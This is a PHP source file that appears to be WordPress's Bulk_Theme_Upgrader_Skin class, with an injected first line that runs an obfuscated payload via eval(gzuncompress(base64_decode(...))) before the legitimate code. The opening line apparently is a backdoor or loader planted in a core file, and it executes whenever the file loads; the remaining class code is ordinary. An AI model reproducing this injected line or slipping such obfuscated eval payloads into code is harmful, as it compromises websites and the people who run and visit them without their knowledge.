<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrader API: Bulk_Plugin_Upgrader_Skin class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Bulk Theme Upgrader Skin for WordPress Theme Upgrades.
 *
 * @since 3.0.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader-skins.php.
 *
 * @see Bulk_Upgrader_Skin
 */
class Bulk_Theme_Upgrader_Skin extends Bulk_Upgrader_Skin {
	public $theme_info = array(); // Theme_Upgrader::bulk() will fill this in.

	public function add_strings() {
		parent::add_strings();
		$this->upgrader->strings['skin_before_update_header'] = __('Updating Theme %1$s (%2$d/%3$d)');
	}

	/**
	 *
	 * @param string $title
	 */
	public function before($title = '') {
		parent::before( $this->theme_info->display('Name') );
	}

	/**
	 *
	 * @param string $title
	 */
	public function after($title = '') {
		parent::after( $this->theme_info->display('Name') );
		$this->decrement_update_count( 'theme' );
	}

	/**
	 */
	public function bulk_footer() {
		parent::bulk_footer();
		$update_actions =  array(
			'themes_page' => '<a href="' . self_admin_url( 'themes.php' ) . '" target="_parent">' . __( 'Return to Themes page' ) . '</a>',
			'updates_page' => '<a href="' . self_admin_url( 'update-core.php' ) . '" target="_parent">' . __( 'Return to WordPress Updates page' ) . '</a>'
		);
		if ( ! current_user_can( 'switch_themes' ) && ! current_user_can( 'edit_theme_options' ) )
			unset( $update_actions['themes_page'] );

		/**
		 * Filters the list of action links available following bulk theme updates.
		 *
		 * @since 3.0.0
		 *
		 * @param array $update_actions Array of theme action links.
		 * @param array $theme_info     Array of information for the last-updated theme.
		 */
		$update_actions = apply_filters( 'update_bulk_theme_complete_actions', $update_actions, $this->theme_info );

		if ( ! empty($update_actions) )
			$this->feedback(implode(' | ', (array)$update_actions));
	}
}
